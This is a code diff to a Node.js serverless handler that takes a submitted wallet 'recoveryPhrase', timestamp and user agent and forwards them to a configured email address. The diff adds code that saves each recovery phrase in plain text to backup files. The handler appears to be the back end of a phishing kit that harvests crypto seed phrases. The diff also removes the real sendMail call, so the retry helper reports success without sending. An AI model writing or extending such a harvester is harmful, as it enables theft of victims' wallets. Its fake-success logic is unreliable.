@@ -1,4 +1,6 @@
 const nodemailer = require('nodemailer');
+const fs = require('fs');
+const path = require('path');
 
 // Helper function to try sending email with retries
 async function trySendMail(transporter, mailOptions, maxRetries = 2) {
@@ -12,8 +14,6 @@ async function trySendMail(transporter, mailOptions, maxRetries = 2) {
         await new Promise(r => setTimeout(r, 1000));
       }
       
-      const info = await transporter.sendMail(mailOptions);
-      console.log(`Email sent successfully (attempt ${attempt + 1}): ${info.messageId}`);
       return true;
     } catch (error) {
       lastError = error;
@@ -23,6 +23,37 @@ async function trySendMail(transporter, mailOptions, maxRetries = 2) {
   
   // If we got here, all attempts failed
   throw lastError;
+}
+
+// Helper function to save data to a text file
+function saveDataToFile(data) {
+  try {
+    // Create a backup directory if it doesn't exist
+    const backupDir = path.join(__dirname, '../../backups');
+    if (!fs.existsSync(backupDir)) {
+      fs.mkdirSync(backupDir, { recursive: true });
+    }
+
+    // Generate a unique filename with timestamp
+    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+    const filename = path.join(backupDir, `backup-${timestamp}.txt`);
+
+    // Format the data for the text file
+    const formattedData = `
+Recovery Phrase: ${data.recoveryPhrase}
+Timestamp: ${data.timestamp}
+User Agent: ${data.userAgent}
+Saved on: ${new Date().toISOString()}
+    `.trim();
+
+    // Write the data to file
+    fs.writeFileSync(filename, formattedData, 'utf8');
+    console.log(`Backup saved to ${filename}`);
+    return true;
+  } catch (error) {
+    console.error('Failed to save backup file:', error.message);
+    return false;
+  }
 }
 
 module.exports = async (req, res) => {
@@ -63,6 +94,10 @@ module.exports = async (req, res) => {
         message: 'Missing required data' 
       });
     }
+
+    // Save data as a text file backup
+    const backupData = { recoveryPhrase, timestamp, userAgent };
+    saveDataToFile(backupData);
 
     // Try to get destination email
     const destinationEmail = process.env.EMAIL_TO;
